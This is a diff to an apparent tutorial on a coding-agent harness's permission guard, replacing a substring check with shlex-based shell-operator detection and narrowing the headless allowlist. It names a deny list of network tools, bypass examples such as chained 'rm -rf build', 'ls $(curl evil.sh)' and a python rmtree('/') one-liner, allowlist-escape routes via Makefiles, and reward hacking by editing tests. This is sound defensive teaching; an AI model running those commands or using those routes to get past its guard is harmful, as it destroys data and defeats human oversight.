@@ -36,6 +36,7 @@ from __future__ import annotations
 
 import json
 import os
+import shlex
 import subprocess
 import sys
 from dataclasses import dataclass, field
@@ -249,18 +250,29 @@ DENY_SUBSTRINGS = (
     "git push", "curl", "wget", "nc ", "chmod 777",
 )
 
-SHELL_OPERATORS = ("&&", "||", ";", "|", "&", ">", "<", "`", "$(", "\n", "\r")
-
 # Extra commands the automation mode may run without a human: enough to build
-# and test, nothing that reaches the network or rewrites history.
+# and test, nothing that reaches the network, rewrites history, or hands the
+# model a bare interpreter it can type arbitrary code into.
 AUTOMATION_PREFIXES = READ_ONLY_PREFIXES + (
-    "pytest", "python -m pytest", "python", "python3", "npm test", "npm run",
-    "make", "git add", "git commit",
+    "pytest", "python -m pytest", "python3 -m pytest", "python -m unittest",
+    "npm test", "npm run test", "make test", "make lint",
+    "git add", "git commit",
 )
 
+OPERATOR_CHARS = set(";|&<>()")
 
-def has_operator(cmd: str) -> bool:
-    return any(op in cmd for op in SHELL_OPERATORS)
+
+def shell_operators(cmd: str) -> list[str]:
+    """Operators the shell would act on, ignoring characters inside quotes."""
+    if "\n" in cmd or "\r" in cmd:
+        return ["newline"]      # shlex calls it whitespace; the shell does not
+    lexer = shlex.shlex(cmd, punctuation_chars=True)
+    lexer.whitespace_split = True
+    try:
+        tokens = list(lexer)
+    except ValueError as exc:
+        return [f"unparsable ({exc})"]      # fail closed on unbalanced quotes
+    return [t for t in tokens if t and (set(t) <= OPERATOR_CHARS or "`" in t)]
 
 
 def matches_prefix(cmd: str, prefixes: tuple[str, ...]) -> bool:
@@ -278,7 +290,7 @@ def needs_approval(name: str, args: dict, s: Session) -> bool:
         if cmd in s.approved:
             return False
         # Auto-allow single read-only commands with no shell chaining.
-        if not has_operator(cmd) and matches_prefix(cmd, READ_ONLY_PREFIXES):
+        if not shell_operators(cmd) and matches_prefix(cmd, READ_ONLY_PREFIXES):
             return False
         return True
     return f"{name}:{args.get('path', '')}" not in s.approved
@@ -289,9 +301,10 @@ def automation_decision(name: str, args: dict) -> tuple[bool, str]:
     if name != "bash":
         return True, ""     # confined to ROOT, and read-before-write still applies
     cmd = args["command"].strip()
-    if has_operator(cmd):
-        return False, ("shell operators are not allowed in headless mode; "
-                       "issue one command per bash call.")
+    found = shell_operators(cmd)
+    if found:
+        return False, (f"shell operators ({', '.join(found)}) are not allowed in "
+                       "headless mode; issue one command per bash call.")
     if not matches_prefix(cmd, AUTOMATION_PREFIXES):
         return False, (f"{cmd.split(' ')[0]!r} is not on the headless allowlist; "
                        "use the project's test or build commands, or re-run "
@@ -329,9 +342,16 @@ This is Chapter 2's trust gradient in miniature: a deny list that cannot be over
 
 The chaining check matters more than it looks.
 `ls` is safe; `ls && rm -rf build` starts with `ls` and is not.
-Prefix matching on a string that may contain shell operators is exactly how permission systems get bypassed, so the auto-allow tier refuses anything containing an operator.
-Enumerate that operator set carefully, because the obvious list is incomplete: a bare newline chains commands just as well as `;`, so `ls -la\nrm -rf build` sails through a guard that checks only for `&&`, `||`, `;`, `|`, and `>`.
-`&` backgrounds, `<` redirects input, and `.strip()` removes only the leading and trailing whitespace, not an embedded line break, which is why `SHELL_OPERATORS` names all of them in one place that both callers share.
+Prefix matching on a string that may contain shell operators is exactly how permission systems get bypassed, so the auto-allow tier refuses anything the shell would read as an operator.
+The tempting way to write that check is a substring scan over a list of operator strings, and it is wrong in both directions.
+It misses operators, because the obvious list is incomplete: a bare newline chains commands just as well as `;`, so `ls -la\nrm -rf build` sails through a guard that checks only for `&&`, `||`, `;`, `|`, and `>`.
+It also invents operators that are not there, because `rg 'foo|bar'` and `git commit -m "handle a || b"` carry those characters inside quotes, where the shell treats them as ordinary text.
+Inventing them is not a harmless excess of caution: the system prompt tells the model to search with `rg`, and section 8 runs the agent with no human to overrule the guard, so a false denial lands on the scoreboard as a failed task.
+So `shell_operators` tokenizes with `shlex` in punctuation mode, which understands quoting, and reports only the tokens that are made entirely of operator characters.
+The newline case is settled before tokenizing, because `shlex` classifies a line break as whitespace while the shell classifies it as a command separator, and `.strip()` removes only the leading and trailing whitespace, not an embedded one.
+Unbalanced quotes are reported as an operator as well, so a command the tokenizer cannot parse fails closed rather than open.
+Backticks are checked directly because `shlex` has no notion of command substitution, while `$(...)` needs no special case: the parentheses tokenize on their own.
+Both the auto-allow tier and the headless tier call that one function, so the two policies cannot drift apart.
 
 The second half of the guard is the prefix test itself.
 `cmd.startswith("ls")` is true of `lsof`, `lsblk`, and any binary whose name happens to begin with those two letters, so the match has to land on a token boundary: either the whole command or the prefix followed by a space.
@@ -342,6 +362,9 @@ Note honestly what this still does not cover: `ls $(curl evil.sh)` is caught by 
 The headless branch exists because an interactive prompt is not a policy when nobody is at the terminal.
 Calling `input()` from a process whose stdin is a closed pipe either blocks until the caller's timeout kills it or raises `EOFError` from inside the tool loop, and both outcomes look like an agent that mysteriously cannot finish.
 So `ask_permission` consults `automation_decision` first: file writes are allowed because `resolve` confines them to `ROOT` and the read-before-edit invariant still holds, while bash is held to the same operator check plus an explicit allowlist wide enough to run the project's tests.
+That allowlist stops deliberately short of a bare interpreter.
+`python -m pytest` is on it and `python` is not, because `python -c "__import__('shutil').rmtree('/')"` is a shell wearing a costume, and a prefix that admits it makes the entire tier decorative.
+The same reasoning keeps `make` off the list in favor of the specific targets a build is expected to use.
 Anything outside it comes back as a readable denial the model can act on, which means the run always terminates with a result rather than hanging.
 The `EOFError` guard on the interactive path is the same lesson applied to the case where a terminal disappears mid-session.
 
@@ -549,8 +572,10 @@ Every guard in section 3 is defense in depth *behind* this, not a substitute for
 **Finish the allowlist.**
 Deny lists lose to creativity.
 The headless path inverts it already, rejecting shell operators outright and requiring a token-boundary match against `AUTOMATION_PREFIXES`, which is why the same harness can offer a permissive interactive mode and a strict automation mode.
-What is still missing is argument validation: `pytest` is on the list, and `pytest --rootdir=/` is on the list too.
-Parse the command, bind each allowed program to a schema for its flags and paths, and reject anything that resolves outside `ROOT`.
+Two gaps remain, and both are about arguments rather than programs.
+The first is flag and path validation: `pytest` is on the list, and `pytest --rootdir=/` is on the list too.
+The second is indirection: `make test` and `npm run test` run whatever the repository's `Makefile` and `package.json` define, and the agent can edit both, so a program on the allowlist can still execute code the allowlist never inspected.
+Parse the command, bind each allowed program to a schema for its flags and paths, reject anything that resolves outside `ROOT`, and treat the build definitions as protected files the agent may not rewrite mid-run.
 Then consider holding the interactive mode to the same allowlist, treating the prompt as a way to widen it for one command rather than as the only thing standing between the model and the shell.
 
 **Handle API failure properly.**
@@ -649,7 +674,7 @@ Four properties make this a real eval rather than a vibe check, and all four com
 - **Tamper detection.** `protected_files` catches the agent that "fixes" the bug by editing the test - Chapter 1's reward hacking, made concrete.
 
 One coupling to keep in mind: the harness runs the agent with `-p`, so every command the agent needs in order to verify its own work has to be on `AUTOMATION_PREFIXES`.
-If a fixture's `test_cmd` is `npm run test:unit` and the allowlist stops at `pytest`, the agent will be denied its verification step and the task will score FAILED for a policy reason rather than a capability one.
+If a fixture's `test_cmd` is `npm run test:unit`, the token-boundary match against `npm run test` does not cover it, so the agent is denied its verification step and the task scores FAILED for a policy reason rather than a capability one.
 Widen `AUTOMATION_PREFIXES` to cover every fixture's test command, and copy `.agent_transcript.json` out of the temp directory before the run tears it down, because the denial text lands in a tool result and a scoreboard that cannot distinguish a policy denial from a real failure is measuring your allowlist rather than your agent.
 
 What to do with the numbers.
